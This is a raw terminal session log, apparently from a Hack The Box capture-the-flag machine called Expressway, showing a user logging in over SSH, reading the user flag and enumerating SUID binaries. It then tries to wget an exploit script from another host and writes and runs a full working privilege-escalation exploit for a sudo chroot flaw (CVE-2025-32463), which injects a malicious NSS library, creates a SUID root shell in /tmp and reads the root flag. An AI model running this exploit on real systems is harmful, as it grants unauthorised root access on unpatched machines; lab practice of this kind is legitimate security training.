╭─ ~/43/hx/ctf/htb/rooms/expressway ············································································································· 3s 08:29:25
╰─❯ ssh ike@10.10.11.87                             
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec 10 07:29:43 2025 from 10.10.14.200
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt 
cd72149364d8a5d71231047802c58d80
ike@expressway:~$ find / -type f -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
ike@expressway:~$ /usr/local/bin/sudo --version   
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
ike@expressway:~$ wget http://10.10.16.3:8000/cve-2025-32463.sh
--2025-12-10 07:56:26--  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 07:58:42--  (try: 2)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:00:58--  (try: 3)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... ^C
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ ^C
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ 
ike@expressway:~$ ls
user.txt
ike@expressway:~$ # Now download (should work)
wget http://10.10.16.3:8000/cve-2025-32463.sh
chmod +x cve-2025-32463.sh
./cve-2025-32463.sh
--2025-12-10 08:13:20--  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:15:36--  (try: 2)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:17:52--  (try: 3)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:20:10--  (try: 4)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:22:29--  (try: 5)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:24:49--  (try: 6)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:27:09--  (try: 7)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:29:29--  (try: 8)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:31:52--  (try: 9)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:34:14--  (try:10)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:36:38--  (try:11)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:39:02--  (try:12)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... failed: Connection timed out.
Retrying.

--2025-12-10 08:41:25--  (try:13)  http://10.10.16.3:8000/cve-2025-32463.sh
Connecting to 10.10.16.3:8000... ^C
chmod: cannot access 'cve-2025-32463.sh': No such file or directory
-bash: ./cve-2025-32463.sh: No such file or directory
ike@expressway:~$ ^C
ike@expressway:~$ cat > exploit.sh << 'EOF'
#!/bin/bash
STAGE=$(mktemp -d /tmp/pentest.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > pentester.c<<'CEOF'
#include <stdlib.h>
#include <unistd.h>
void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
  execl("/bin/bash", "/bin/bash", NULL);
}
CEOF

mkdir -p pentest/etc libnss_
echo "passwd: /pentester" > pentest/etc/nsswitch.conf
cp /etc/group pentest/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/pentester.so.2 pentester.c
sudo -R pentest pentest
rm -rf ${STAGE?}
EOF

chmod +x exploit.sh
./exploit.sh
/tmp/rootbash -p
cat /root/root.txt
root@expressway:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@expressway:/# pwd
/
root@expressway:/# cd root
root@expressway:/root# ls
root.txt
root@expressway:/root# cat root.txt 
070e641ffc87663630be36c7151ca96e
root@expressway:/root# 
